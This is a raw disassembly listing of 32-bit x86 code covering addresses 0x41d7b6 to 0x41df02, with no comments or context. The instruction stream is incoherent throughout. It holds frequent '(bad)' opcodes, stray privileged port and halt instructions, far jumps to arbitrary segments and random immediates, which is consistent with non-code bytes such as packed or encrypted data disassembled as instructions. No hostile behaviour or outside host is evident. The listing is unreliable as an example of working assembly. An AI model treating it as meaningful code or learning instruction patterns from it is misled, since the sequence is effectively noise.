  41d7b6:	jbe    0x41d7e3
  41d7b8:	add    DWORD PTR [edi-0x6e],esi
  41d7bb:	add    BYTE PTR [ecx],ah
  41d7bd:	ss das 
  41d7bf:	xlat   BYTE PTR ds:[ebx]
  41d7c0:	jno    0x41d809
  41d7c2:	(bad)  
  41d7c4:	aaa    
  41d7c5:	cmp    al,0x5a
  41d7c7:	test   BYTE PTR [ecx+0x3edb5b1e],dh
  41d7cd:	rcl    BYTE PTR [ebx+0x7d],1
  41d7d0:	or     ah,0x9e
  41d7d3:	jnp    0x41d7f8
  41d7d5:	pop    edi
  41d7d6:	(bad)  
  41d7d7:	pop    esp
  41d7d8:	or     ecx,DWORD PTR [eax+esi*1+0x46]
  41d7dc:	icebp  
  41d7dd:	pop    ecx
  41d7de:	fstp   DWORD PTR [ebp-0x77f8c944]
  41d7e4:	sub    al,0xfa
  41d7e6:	mov    WORD PTR [ebx],gs
  41d7e8:	xor    BYTE PTR [esi+ebx*4],ch
  41d7eb:	mov    bl,0x24
  41d7ed:	dec    eax
  41d7ee:	jno    0x41d7bb
  41d7f0:	sub    BYTE PTR [esi],0xfa
  41d7f3:	dec    ebx
  41d7f4:	sub    al,0xf8
  41d7f6:	fcomi  st,st(0)
  41d7f8:	or     eax,0x65b8b578
  41d7fd:	(bad)  
  41d7fe:	test   ebp,0x6559c56e
  41d804:	daa    
  41d805:	rcl    dh,1
  41d807:	jl     0x41d807
  41d809:	xor    BYTE PTR [ebp-0x79b23c4c],al
  41d80f:	inc    edi
  41d810:	(bad)  
  41d811:	fsub   DWORD PTR [ecx+0x21783e50]
  41d817:	sub    esp,DWORD PTR gs:[edx+0x36aaa915]
  41d81e:	pop    ss
  41d81f:	popa   
  41d820:	shr    dl,0x1d
  41d823:	cmp    DWORD PTR [esi-0x4f579cbe],0x1f792e6f
  41d82d:	cmp    eax,0xcc44350b
  41d832:	xor    al,0x6c
  41d834:	rcr    al,1
  41d836:	adc    bl,BYTE PTR es:[ecx+0x3e5ee1f6]
  41d83d:	push   ss
  41d83e:	or     dh,bl
  41d840:	std    
  41d841:	mov    DWORD PTR [ecx+eiz*8],esi
  41d844:	and    eax,0x4957a2c1
  41d849:	push   0x3b
  41d84b:	dec    ecx
  41d84c:	sub    dl,BYTE PTR [edx+eiz*4+0x7973edec]
  41d853:	aam    0xbd
  41d855:	lods   eax,DWORD PTR ds:[esi]
  41d856:	add    eax,0x4a516ce2
  41d85b:	lea    ecx,[ebx-0x17]
  41d85e:	in     al,dx
  41d85f:	ficom  DWORD PTR [esi]
  41d861:	mul    DWORD PTR [eax+0x106b284]
  41d867:	aad    0x3b
  41d869:	jmp    0x41d810
  41d86b:	mov    BYTE PTR [ebx-0x3f58a733],cl
  41d871:	add    eax,0x4d9d5f68
  41d876:	aas    
  41d877:	jl     0x41d87a
  41d879:	push   esi
  41d87a:	std    
  41d87b:	retf   
  41d87c:	push   cs
  41d87d:	sbb    dl,BYTE PTR [edi*2-0x60d850a5]
  41d884:	lock pop eax
  41d886:	mov    gs,WORD PTR [ebx-0x45]
  41d889:	in     al,0x61
  41d88b:	into   
  41d88c:	inc    esi
  41d88d:	jge    0x41d825
  41d88f:	(bad)  
  41d890:	rol    BYTE PTR [esi],cl
  41d892:	or     eax,0xec5153ac
  41d897:	rcl    ebx,0x9e
  41d89a:	leave  
  41d89b:	call   0x8f858e89
  41d8a0:	xor    al,0x30
  41d8a2:	icebp  
  41d8a3:	outs   dx,DWORD PTR es:[esi]
  41d8a5:	dec    eax
  41d8a6:	jns    0x41d8a6
  41d8a8:	cmp    ch,ch
  41d8aa:	xor    edx,DWORD PTR [ecx-0x5f]
  41d8ad:	test   BYTE PTR [edx],ch
  41d8af:	xchg   ebp,eax
  41d8b0:	sbb    BYTE PTR [eax],0x8c
  41d8b3:	cmp    bh,bl
  41d8b5:	iret   
  41d8b6:	dec    eax
  41d8b7:	je     0x41d887
  41d8b9:	rol    BYTE PTR [ebx+0x14e3394a],1
  41d8bf:	mov    ecx,0x585f5c9f
  41d8c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c5:	icebp  
  41d8c6:	aam    0x2d
  41d8c8:	out    0xaf,eax
  41d8ca:	test   eax,0x2ff1f71b
  41d8cf:	ficom  DWORD PTR ds:0x315bbb28
  41d8d5:	ret    0x91cc
  41d8d8:	add    al,0x99
  41d8da:	in     eax,0x4d
  41d8dc:	(bad)  
  41d8dd:	outs   dx,BYTE PTR ds:[esi]
  41d8de:	add    BYTE PTR [edi+0xa],0x53
  41d8e2:	leave  
  41d8e3:	sbb    al,0x9f
  41d8e5:	clc    
  41d8e6:	pop    eax
  41d8e7:	les    ebx,FWORD PTR [edi]
  41d8e9:	sub    al,0x44
  41d8eb:	xchg   esi,eax
  41d8ec:	das    
  41d8ed:	cmp    ebx,DWORD PTR [esi+0x2ac2328b]
  41d8f3:	jge    0x41d936
  41d8f5:	sbb    al,0x48
  41d8f7:	xchg   ebp,eax
  41d8f8:	pop    esi
  41d8f9:	and    DWORD PTR [edx-0x5723af30],esi
  41d8ff:	ss jmp 0x41d935
  41d902:	outs   dx,DWORD PTR ds:[esi]
  41d903:	sub    eax,DWORD PTR [esi+0x6dbc5d18]
  41d909:	dec    ebx
  41d90a:	xor    dh,dh
  41d90c:	or     BYTE PTR [eax],bh
  41d90e:	call   FWORD PTR [ebx+0x1e]
  41d911:	dec    esp
  41d912:	pop    ss
  41d913:	or     DWORD PTR [ecx-0x311b287a],esp
  41d919:	vunpcklps ymm3,ymm3,ymm1
  41d91d:	mov    ch,0xf6
  41d91f:	add    al,0x8c
  41d921:	mov    ds:0xde2f0147,al
  41d926:	clc    
  41d927:	mov    edx,0x46eb90a5
  41d92c:	lock mov edx,0xa6eee915
  41d932:	stos   DWORD PTR es:[edi],eax
  41d933:	loop   0x41d907
  41d935:	std    
  41d936:	xchg   edx,eax
  41d937:	add    al,0xbe
  41d939:	sub    ch,bh
  41d93b:	jle    0x41d934
  41d93d:	push   0xfffffff4
  41d93f:	dec    eax
  41d940:	sar    BYTE PTR [esi+edx*8],0xe3
  41d944:	(bad)  
  41d945:	test   DWORD PTR [eax-0x75cb3c19],0x1d298e14
  41d94f:	xor    ah,bl
  41d951:	mov    esp,0x55d9a31e
  41d956:	stos   BYTE PTR es:[edi],al
  41d957:	push   es
  41d958:	sub    eax,0xc0f0f16a
  41d95d:	stos   BYTE PTR es:[edi],al
  41d95e:	sbb    edi,DWORD PTR [edi-0x4]
  41d961:	xchg   edx,eax
  41d962:	add    BYTE PTR [eax-0x69],ah
  41d965:	std    
  41d966:	dec    ebp
  41d967:	pop    ecx
  41d968:	sub    edi,DWORD PTR [esi-0x66]
  41d96b:	and    eax,0xf305319f
  41d970:	adc    DWORD PTR [eax],edx
  41d972:	mov    eax,ds:0xcc81d7f1
  41d977:	mov    ebp,0xa6f68ef3
  41d97c:	inc    ecx
  41d97d:	xor    DWORD PTR [ebx],ecx
  41d97f:	pop    es
  41d980:	jns    0x41d932
  41d982:	loop   0x41d933
  41d984:	in     al,dx
  41d985:	xchg   DWORD PTR [edi],esi
  41d987:	mov    WORD PTR ds:0x5cd1f8d5,cs
  41d98d:	into   
  41d98e:	inc    ecx
  41d98f:	and    DWORD PTR es:[edi],edx
  41d992:	enter  0xae83,0x72
  41d996:	out    dx,eax
  41d997:	cmp    al,0xa8
  41d999:	jg     0x41d9c3
  41d99b:	popf   
  41d99c:	stc    
  41d99d:	in     eax,dx
  41d99e:	jbe    0x41da04
  41d9a0:	dec    edi
  41d9a1:	xchg   ebp,eax
  41d9a2:	inc    ebp
  41d9a3:	inc    ebx
  41d9a4:	icebp  
  41d9a5:	xor    esi,eax
  41d9a7:	add    esp,DWORD PTR [esp+ebx*1]
  41d9aa:	and    DWORD PTR [edi+0x7301aa06],esi
  41d9b0:	aaa    
  41d9b1:	pop    ebx
  41d9b2:	sub    ah,BYTE PTR [ebp+0x0]
  41d9b5:	icebp  
  41d9b6:	adc    edi,DWORD PTR [ecx-0xb]
  41d9b9:	mov    bh,0x5b
  41d9bb:	mov    dh,0x3b
  41d9bd:	mov    al,0x8c
  41d9bf:	xchg   ax,ax
  41d9c1:	xchg   ebx,eax
  41d9c2:	stc    
  41d9c3:	push   es
  41d9c4:	cmp    al,0xe1
  41d9c6:	fs jge 0x41d98d
  41d9c9:	dec    ebx
  41d9ca:	add    eax,0x7e0a1c58
  41d9cf:	mov    al,ss:0xb69a308
  41d9d5:	in     eax,0x38
  41d9d7:	pop    esp
  41d9d8:	jl     0x287587ee
  41d9de:	dec    eax
  41d9df:	push   esi
  41d9e0:	int    0x3e
  41d9e2:	or     ebx,ebp
  41d9e4:	sub    edx,ebx
  41d9e6:	rcr    BYTE PTR [ecx-0x32],1
  41d9e9:	xchg   esp,eax
  41d9ea:	mov    eax,DWORD PTR [ebp-0x1ac508e]
  41d9f0:	sbb    eax,0xd4229057
  41d9f5:	cmp    al,0x5f
  41d9f7:	(bad)  
  41d9f8:	lock push ss
  41d9fa:	pop    ebx
  41d9fb:	out    0x29,al
  41d9fd:	push   edi
  41d9fe:	fild   DWORD PTR [esi]
  41da00:	lods   eax,DWORD PTR ds:[esi]
  41da01:	rcr    DWORD PTR [edx],cl
  41da03:	or     edi,esp
  41da05:	mov    ecx,0xdeeff6b5
  41da0a:	xor    BYTE PTR [edx+eax*8+0x37c32db9],cl
  41da11:	ja     0x41da44
  41da13:	push   es
  41da14:	aad    0xd6
  41da16:	nop
  41da17:	fidiv  DWORD PTR [ebp-0x77]
  41da1a:	das    
  41da1b:	lods   al,BYTE PTR ds:[esi]
  41da1c:	daa    
  41da1d:	inc    ebp
  41da1e:	pop    edx
  41da1f:	ins    DWORD PTR es:[edi],dx
  41da20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da21:	sub    eax,0x34008b0
  41da26:	sbb    BYTE PTR [ebp+0x4a0d9eaf],dh
  41da2c:	popa   
  41da2d:	mov    al,0x2a
  41da2f:	xchg   ebx,eax
  41da30:	xor    eax,0xcaefb662
  41da35:	stos   DWORD PTR es:[edi],eax
  41da36:	adc    al,0x30
  41da38:	inc    esp
  41da39:	cmp    ecx,DWORD PTR [eax-0x36]
  41da3c:	jae    0x41da02
  41da3e:	xchg   ecx,eax
  41da3f:	mov    cl,0xd9
  41da41:	pop    ebx
  41da42:	mov    edx,ecx
  41da44:	jle    0x41da83
  41da46:	arpl   WORD PTR [edx],bx
  41da48:	inc    ebp
  41da49:	mov    ch,0xac
  41da4b:	xchg   edi,eax
  41da4c:	push   cs
  41da4d:	dec    edi
  41da4e:	jne    0x41d9d7
  41da50:	cmp    cl,BYTE PTR [ecx-0x6cbe5e8]
  41da56:	repz loope 0x41da12
  41da59:	adc    ebp,edx
  41da5b:	mov    ds:0x86f34c6e,eax
  41da60:	(bad)  
  41da61:	push   edi
  41da62:	xchg   BYTE PTR [ecx+ebx*1-0x5acbb5e4],bl
  41da69:	mov    edi,0x79be2d46
  41da6e:	dec    ebp
  41da6f:	bound  ebp,QWORD PTR [ecx+esi*2-0x3f]
  41da73:	call   0xd84b:0xd8a9e0b0
  41da7a:	cmc    
  41da7b:	fidivr DWORD PTR [edi]
  41da7d:	mov    WORD PTR [ebp-0x6],fs
  41da80:	adc    al,0xc8
  41da82:	cwde   
  41da83:	jmp    0x680f:0x95a2f8fb
  41da8a:	add    ebx,esi
  41da8c:	cmp    ebx,DWORD PTR [ebx+0x6845175d]
  41da92:	and    eax,DWORD PTR [eax]
  41da94:	cmp    bl,0xf3
  41da97:	cmp    al,0x9e
  41da99:	gs jg  0x41db09
  41da9c:	and    al,0x50
  41da9e:	push   edi
  41da9f:	add    eax,0x406b0220
  41daa4:	(bad)  
  41daa6:	mov    ch,0x3a
  41daa8:	pop    ss
  41daa9:	fcom   QWORD PTR ds:0x6007c27d
  41daaf:	fist   DWORD PTR [edi]
  41dab1:	dec    DWORD PTR ds:0x33e9a6ca
  41dab7:	imul   esi,DWORD PTR [eax-0x58],0xffffff91
  41dabb:	adc    eax,0xf8c2ce
  41dac0:	loopne 0x41da6e
  41dac2:	iret   
  41dac3:	adc    al,BYTE PTR [edx-0x3bfc62f7]
  41dac9:	rcr    BYTE PTR [edx-0x4b],1
  41dacc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dacd:	int3   
  41dace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dacf:	mov    esi,0x1846ee55
  41dad4:	jmp    0x6938:0x72d160f9
  41dadb:	mov    fs,esi
  41dadd:	mov    cl,0x39
  41dadf:	imul   ecx,DWORD PTR [ebx+0x43a339a4],0xffffff88
  41dae6:	xchg   ebx,eax
  41dae7:	out    0xb6,eax
  41dae9:	in     al,dx
  41daea:	add    eax,0xc156c469
  41daef:	mov    ds:0x6b7b0cc1,al
  41daf4:	pop    edi
  41daf5:	dec    esi
  41daf6:	sbb    BYTE PTR ds:0x93fad43a,ch
  41dafc:	push   ecx
  41dafd:	adc    DWORD PTR [ecx-0x24],edi
  41db00:	dec    ecx
  41db01:	xlat   BYTE PTR ds:[ebx]
  41db02:	icebp  
  41db03:	mov    cl,0xe1
  41db05:	inc    ecx
  41db06:	aad    0x86
  41db08:	test   cl,ah
  41db0a:	mov    dh,0x17
  41db0c:	add    al,0xd9
  41db0e:	shr    DWORD PTR [edi],1
  41db10:	sahf   
  41db11:	jl     0x41daa1
  41db13:	iret   
  41db14:	xchg   esp,eax
  41db15:	call   FWORD PTR [edi+0x51ea59a]
  41db1b:	mov    ah,0x7c
  41db1d:	pop    ecx
  41db1e:	outs   dx,BYTE PTR ds:[esi]
  41db1f:	jbe    0x41db69
  41db21:	(bad)  
  41db22:	pop    edi
  41db23:	sub    ah,BYTE PTR [ebx]
  41db25:	mov    eax,ds:0x8d616141
  41db2a:	dec    esp
  41db2b:	outs   dx,BYTE PTR ds:[esi]
  41db2c:	ins    BYTE PTR es:[edi],dx
  41db2d:	test   eax,0xacb7adc
  41db32:	ins    DWORD PTR es:[edi],dx
  41db33:	or     eax,0x34931d75
  41db38:	and    BYTE PTR [ecx+edx*1],dl
  41db3b:	cmp    ch,BYTE PTR [ebx]
  41db3d:	mov    cs,WORD PTR [ebx+0x5f]
  41db40:	jl     0x41dae4
  41db42:	mov    eax,ebp
  41db44:	xchg   ecx,eax
  41db45:	push   0x750af91
  41db4a:	stos   BYTE PTR es:[edi],al
  41db4b:	mov    eax,DWORD PTR [edi+0x7ab8cba1]
  41db51:	xchg   esp,eax
  41db52:	jno    0x41db5c
  41db54:	test   BYTE PTR [ecx+esi*8+0x70c1f149],dl
  41db5b:	fmulp  st(6),st
  41db5d:	pop    es
  41db5e:	mov    WORD PTR [edi],ss
  41db60:	outs   dx,BYTE PTR ds:[esi]
  41db61:	outs   dx,BYTE PTR ds:[esi]
  41db62:	mov    ebx,0x8b264248
  41db67:	mov    ch,0x75
  41db69:	lods   al,BYTE PTR ds:[esi]
  41db6a:	jnp    0x41db4c
  41db6c:	xchg   BYTE PTR ds:0x23eaf5b,dl
  41db72:	dec    eax
  41db73:	push   cs
  41db74:	cmp    DWORD PTR [esp+eax*4+0x6cdab5d],ebx
  41db7b:	jg     0x41db91
  41db7d:	dec    eax
  41db7e:	push   ds
  41db7f:	inc    edx
  41db80:	and    edx,DWORD PTR [ebx-0x77]
  41db83:	push   eax
  41db84:	out    0xb7,al
  41db86:	and    DWORD PTR [edx+ebp*1+0x68],edx
  41db8a:	in     al,0xae
  41db8c:	mov    eax,0xdc71054b
  41db91:	data16 cmp BYTE PTR [ecx+0x6a],0x92
  41db96:	and    ebx,DWORD PTR cs:[edi+0x7ddc3f21]
  41db9d:	rcl    esp,cl
  41db9f:	mov    edx,eax
  41dba1:	loopne 0x41db6a
  41dba3:	add    al,bh
  41dba5:	cmp    eax,0x94dbff5
  41dbaa:	jns    0x41dc1d
  41dbac:	fisub  WORD PTR [eax]
  41dbae:	jecxz  0x41dbda
  41dbb0:	hlt    
  41dbb1:	fidivr WORD PTR [ecx+0x51]
  41dbb4:	aaa    
  41dbb5:	jle    0x41dc0c
  41dbb7:	or     DWORD PTR [esi+ecx*8+0x1e],esi
  41dbbb:	fwait
  41dbbc:	xchg   dh,ah
  41dbbe:	idiv   DWORD PTR [eax]
  41dbc0:	sub    esi,ebx
  41dbc2:	adc    ecx,esi
  41dbc4:	shl    BYTE PTR [ebx+0x5d38f5c3],0x55
  41dbcb:	mov    edx,DWORD PTR [esi-0xd]
  41dbce:	jge    0x41db51
  41dbd0:	mov    DWORD PTR [esi-0x53],esp
  41dbd3:	(bad)  
  41dbd4:	shl    BYTE PTR [ebx+ebp*2],1
  41dbd7:	cs and eax,0xa687dc56
  41dbdd:	jns    0x41dc5b
  41dbdf:	popf   
  41dbe0:	and    DWORD PTR [ebx],esi
  41dbe2:	jmp    0x3f38473b
  41dbe7:	fdiv   DWORD PTR [edx]
  41dbe9:	jbe    0x41dc07
  41dbeb:	mov    ecx,0x6e47ab85
  41dbf0:	(bad)  
  41dbf1:	test   dl,0x28
  41dbf4:	mov    cl,0xd2
  41dbf6:	sub    dl,BYTE PTR [esi+0x48]
  41dbf9:	xor    DWORD PTR [eax-0x57],edx
  41dbfc:	je     0x41dc72
  41dbfe:	jp     0x41dbf8
  41dc00:	(bad)  
  41dc01:	sub    eax,0x9191e681
  41dc06:	dec    ecx
  41dc07:	imul   esi,eax,0xffffff91
  41dc0a:	or     DWORD PTR [eax-0x6cdf3eea],ecx
  41dc10:	inc    ecx
  41dc11:	adc    eax,DWORD PTR [edi]
  41dc13:	jne    0x41dbef
  41dc15:	sub    ebp,edx
  41dc17:	sub    BYTE PTR [ebx+0x3c],ah
  41dc1a:	and    eax,0xb6c94298
  41dc1f:	xchg   ecx,eax
  41dc20:	mov    edx,0x21f74b0e
  41dc25:	or     DWORD PTR [ecx],ebx
  41dc27:	or     DWORD PTR [esi+0x6fa0dcee],esi
  41dc2d:	cmc    
  41dc2e:	pop    ebx
  41dc2f:	inc    ecx
  41dc30:	test   al,0x48
  41dc32:	adc    BYTE PTR [ecx-0x21],0x1b
  41dc36:	in     al,dx
  41dc37:	xor    ecx,DWORD PTR cs:[ebx+eiz*2]
  41dc3b:	jb     0x41dcbb
  41dc3d:	push   es
  41dc3e:	je     0x41dbfc
  41dc40:	pop    esp
  41dc41:	jl     0x41dc4b
  41dc43:	xor    edi,DWORD PTR [ebp-0x39]
  41dc46:	mov    al,ds:0xa4b318c1
  41dc4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc4c:	std    
  41dc4d:	or     BYTE PTR [ebp-0x66],ch
  41dc50:	jl     0x41dc36
  41dc52:	das    
  41dc53:	sub    BYTE PTR [ecx-0x7c1008bb],0xcb
  41dc5a:	push   esi
  41dc5b:	jns    0x41dc6d
  41dc5d:	push   ebp
  41dc5e:	pop    ds
  41dc5f:	push   ds
  41dc60:	dec    bx
  41dc62:	add    al,0x23
  41dc64:	(bad)  
  41dc65:	jle    0x41dc56
  41dc67:	sbb    al,0x43
  41dc69:	xchg   edi,eax
  41dc6a:	jmp    0x41dc28
  41dc6c:	push   0x52
  41dc6e:	sbb    eax,DWORD PTR [ecx-0x7f87e455]
  41dc74:	jl     0x41dbf6
  41dc76:	xlat   BYTE PTR ds:[ebx]
  41dc77:	sbb    BYTE PTR [esi+0x3853747c],bh
  41dc7d:	add    BYTE PTR [edx],al
  41dc7f:	push   ebx
  41dc80:	arpl   bx,di
  41dc82:	nop
  41dc83:	mul    DWORD PTR [eax]
  41dc85:	dec    edx
  41dc86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc87:	retf   
  41dc88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc89:	fld    QWORD PTR [eax-0x3]
  41dc8c:	dec    ebx
  41dc8d:	xchg   edx,eax
  41dc8e:	mov    DWORD PTR [ecx],edi
  41dc90:	mov    bh,0xe4
  41dc92:	jmp    0x82cbcbea
  41dc97:	push   cs
  41dc98:	int3   
  41dc99:	xchg   edi,eax
  41dc9a:	loop   0x41dc67
  41dc9c:	hlt    
  41dc9d:	rcr    DWORD PTR [ebx],cl
  41dc9f:	repnz dec ebx
  41dca1:	data16 je 0x41dc3d
  41dca4:	loope  0x41dced
  41dca6:	rcl    bl,1
  41dca8:	in     al,dx
  41dca9:	mov    ebp,0x322ea074
  41dcae:	ficomp DWORD PTR [ebp+0x573cc632]
  41dcb4:	jmp    0x8099:0x22c80df9
  41dcbb:	sub    edi,esi
  41dcbd:	fs ds gs jb 0x41dc92
  41dcc2:	xchg   esi,eax
  41dcc3:	das    
  41dcc4:	jg     0x41dd22
  41dcc6:	jno    0x41dcd9
  41dcc8:	sbb    al,0x28
  41dcca:	push   0x399500e6
  41dccf:	mov    bl,0x65
  41dcd1:	popa   
  41dcd2:	shl    BYTE PTR [ebp+eax*4-0x7d],0x98
  41dcd7:	dec    edx
  41dcd8:	and    al,0xdb
  41dcda:	iret   
  41dcdb:	and    BYTE PTR [eax],cl
  41dcdd:	push   edi
  41dcde:	cmp    ecx,DWORD PTR ds:0x7df6056c
  41dce4:	mov    ah,0xfc
  41dce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dce7:	out    dx,eax
  41dce8:	hlt    
  41dce9:	sub    DWORD PTR [ecx],eax
  41dceb:	cmp    BYTE PTR [eax+0x48],bl
  41dcee:	stos   BYTE PTR es:[edi],al
  41dcef:	xchg   DWORD PTR [esi],ebp
  41dcf1:	mov    bl,0x4b
  41dcf3:	add    eax,0x43d65714
  41dcf8:	outs   dx,BYTE PTR ds:[esi]
  41dcf9:	loop   0x41dd29
  41dcfb:	xchg   BYTE PTR cs:[eax+0x6ed6d744],ch
  41dd02:	cs (bad) 
  41dd05:	pop    ebp
  41dd06:	push   ebx
  41dd07:	mov    ds:0x78ccd694,eax
  41dd0c:	push   ebx
  41dd0d:	lds    esi,FWORD PTR [eax+eax*4]
  41dd10:	stc    
  41dd11:	ret    0xc996
  41dd14:	hlt    
  41dd15:	add    al,ch
  41dd17:	nop
  41dd18:	fldl2t 
  41dd1a:	sbb    BYTE PTR [eax],al
  41dd1c:	test   DWORD PTR [edi],ebp
  41dd1e:	sbb    edi,DWORD PTR [esi]
  41dd20:	xor    BYTE PTR ds:0xe3aec9a1,dh
  41dd26:	out    dx,eax
  41dd27:	pop    ecx
  41dd28:	pop    ecx
  41dd29:	std    
  41dd2a:	xor    edx,eax
  41dd2c:	add    ch,BYTE PTR [eax]
  41dd2e:	lds    ebp,FWORD PTR [edi+edx*1+0xe]
  41dd32:	out    0xe,eax
  41dd34:	inc    esp
  41dd35:	xor    WORD PTR [ebx+0x3e],ax
  41dd39:	enter  0xedf3,0x77
  41dd3d:	or     BYTE PTR [esi+ecx*4+0x75ef71fc],0x69
  41dd45:	jg     0x41dcda
  41dd47:	dec    esp
  41dd48:	add    eax,0x72c823eb
  41dd4d:	std    
  41dd4e:	xor    eax,0x252b4589
  41dd53:	jg     0x41dcd5
  41dd55:	push   ecx
  41dd56:	sbb    al,0x28
  41dd58:	push   edi
  41dd59:	enter  0x3ee4,0x2e
  41dd5d:	repnz pusha 
  41dd5f:	lahf   
  41dd60:	(bad)  [ebx*8-0xa5d6fbb]
  41dd67:	into   
  41dd68:	imul   esp,DWORD PTR cs:[esi-0x35],0x971cc1c5
  41dd70:	das    
  41dd71:	pop    ss
  41dd72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd73:	pop    esp
  41dd74:	outs   dx,BYTE PTR ds:[esi]
  41dd75:	sub    eax,0x13430816
  41dd7a:	cli    
  41dd7b:	xchg   ebp,eax
  41dd7c:	test   al,0xb9
  41dd7e:	out    0x16,al
  41dd80:	cmc    
  41dd81:	mov    dl,0x3d
  41dd83:	adc    bh,BYTE PTR [ecx+0xbace467]
  41dd89:	dec    ebx
  41dd8a:	jns    0x41dd48
  41dd8c:	ins    BYTE PTR es:[edi],dx
  41dd8d:	inc    ebp
  41dd8e:	mov    ds:0xe79fcfc6,eax
  41dd93:	repnz mov ds:0x996837ba,eax
  41dd99:	mov    eax,ds:0xd02a044e
  41dd9e:	or     cl,BYTE PTR [esi-0x67]
  41dda1:	outs   dx,BYTE PTR ds:[esi]
  41dda2:	or     DWORD PTR [ecx+eiz*2+0x5b854823],edx
  41dda9:	inc    edx
  41ddaa:	loopne 0x41dddd
  41ddac:	aaa    
  41ddad:	push   eax
  41ddae:	fscale 
  41ddb0:	add    bh,bl
  41ddb2:	imul   edx,DWORD PTR [edx-0x620ac624],0xfffffff5
  41ddb9:	hlt    
  41ddba:	jae    0x41de2d
  41ddbc:	sbb    edi,DWORD PTR [eax]
  41ddbe:	jg     0x41ddfa
  41ddc0:	mov    ds:0x84ee4341,al
  41ddc5:	stos   DWORD PTR es:[edi],eax
  41ddc6:	test   eax,0x84744ae3
  41ddcb:	aas    
  41ddcc:	fist   DWORD PTR [esi+0x53]
  41ddcf:	dec    esp
  41ddd0:	or     eax,0x5a901b26
  41ddd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddd6:	cmp    al,0x59
  41ddd8:	test   eax,0x441ae1aa
  41dddd:	fndisi(8087 only) 
  41dddf:	push   es
  41dde0:	scas   eax,DWORD PTR es:[edi]
  41dde1:	and    cl,bh
  41dde3:	outs   dx,DWORD PTR ds:[esi]
  41dde4:	cmova  ecx,DWORD PTR [eax-0x31aac51a]
  41ddeb:	mov    ch,BYTE PTR [edi+edi*8-0x27]
  41ddef:	inc    esi
  41ddf0:	aam    0x2a
  41ddf2:	test   BYTE PTR [edx],0xa4
  41ddf5:	mov    ds:0x75187453,al
  41ddfa:	inc    eax
  41ddfb:	and    esi,eax
  41ddfd:	push   es
  41ddfe:	push   ss
  41ddff:	mov    al,0x67
  41de01:	adc    al,0x62
  41de03:	push   0x69a7e53a
  41de08:	push   esp
  41de09:	xlat   BYTE PTR ds:[ebx]
  41de0a:	sub    ebx,DWORD PTR [ebx]
  41de0c:	out    dx,eax
  41de0d:	dec    esp
  41de0e:	inc    ecx
  41de0f:	cmp    al,0x9d
  41de11:	retf   
  41de12:	dec    edx
  41de13:	xchg   edi,eax
  41de14:	or     BYTE PTR [edx-0x10ca7efa],ah
  41de1a:	inc    ecx
  41de1b:	pop    esi
  41de1c:	sub    edx,esi
  41de1e:	mov    bh,0x4b
  41de20:	mov    ds:0x89cee18b,eax
  41de25:	in     al,0x6b
  41de27:	adc    al,0x96
  41de29:	pop    ds
  41de2a:	sbb    al,0x28
  41de2c:	push   0xfffffff9
  41de2e:	and    DWORD PTR [ebx+0x361b0976],esp
  41de34:	ss popa 
  41de36:	push   ebp
  41de37:	mov    ah,0x14
  41de39:	add    cl,BYTE PTR [ecx]
  41de3b:	out    dx,al
  41de3c:	lods   al,BYTE PTR ds:[esi]
  41de3d:	sti    
  41de3e:	mov    eax,0x5e2d00fc
  41de43:	in     eax,0xd3
  41de45:	and    DWORD PTR [edx],esp
  41de47:	fcomp  st(4)
  41de49:	sbb    dl,BYTE PTR [edi-0x72f8251d]
  41de4f:	arpl   WORD PTR [ecx-0x6a063bc0],bp
  41de55:	ins    BYTE PTR es:[edi],dx
  41de56:	arpl   WORD PTR [ebx],bx
  41de58:	les    eax,FWORD PTR [esi-0x58]
  41de5b:	fmul   QWORD PTR [ecx+ebx*4]
  41de5e:	sbb    dh,BYTE PTR [esi+0x64015a5f]
  41de64:	mov    ss,WORD PTR [ebx]
  41de66:	inc    edx
  41de67:	jae    0x41dec6
  41de69:	add    eax,0x469e513a
  41de6e:	les    eax,FWORD PTR [ecx+0x440af930]
  41de74:	cmp    ch,BYTE PTR [esp+ebx*1+0x10e17bec]
  41de7b:	fdivr  DWORD PTR [eax+0x7f642cdf]
  41de81:	inc    edi
  41de82:	sub    BYTE PTR [esi+0x16fe71b5],al
  41de88:	ficomp DWORD PTR [eax+0x23adb57]
  41de8e:	mov    ebx,DWORD PTR [esi+0x78]
  41de91:	hlt    
  41de92:	stos   BYTE PTR es:[edi],al
  41de93:	shl    DWORD PTR [ebp+0xc],0x5b
  41de97:	sbb    al,0x13
  41de99:	rcl    DWORD PTR [edx+0x5b],1
  41de9c:	mov    ebx,DWORD PTR [ebp-0x1815a21b]
  41dea2:	xor    al,0x3f
  41dea4:	push   ebp
  41dea5:	int    0x76
  41dea7:	cmp    al,0x99
  41deaa:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deac:	xchg   ecx,eax
  41dead:	(bad)  
  41deae:	les    edx,FWORD PTR [ecx]
  41deb0:	jnp    0x41de77
  41deb2:	cdq    
  41deb3:	enter  0x5174,0xc4
  41deb7:	add    ecx,DWORD PTR fs:[ebx+0x6e]
  41debb:	and    bl,BYTE PTR [edx*8-0x27adb588]
  41dec2:	sub    dh,BYTE PTR [eax+0x4b157872]
  41dec8:	pop    ss
  41dec9:	sbb    eax,0x5ccadd97
  41dece:	into   
  41decf:	aam    0x9f
  41ded1:	ret    0x109f
  41ded4:	inc    esi
  41ded5:	pop    es
  41ded6:	outs   dx,DWORD PTR ds:[esi]
  41ded7:	mov    edi,0x4ce16458
  41dedc:	daa    
  41dedd:	rcr    DWORD PTR [edi+0x510e564e],0x83
  41dee4:	sti    
  41dee5:	test   eax,0x33020a07
  41deea:	pop    esi
  41deeb:	test   BYTE PTR [edi+ebx*4-0x9],dl
  41deef:	mov    dh,0x52
  41def1:	in     eax,0x57
  41def3:	and    ch,BYTE PTR [ecx-0x61]
  41def6:	jecxz  0x41dec8
  41def8:	out    0x1f,eax
  41defa:	or     edi,ecx
  41defc:	jl     0x41de94
  41defe:	add    DWORD PTR [ebp+eiz*2+0xc],edi
  41df02:	sbb    al,0x6b
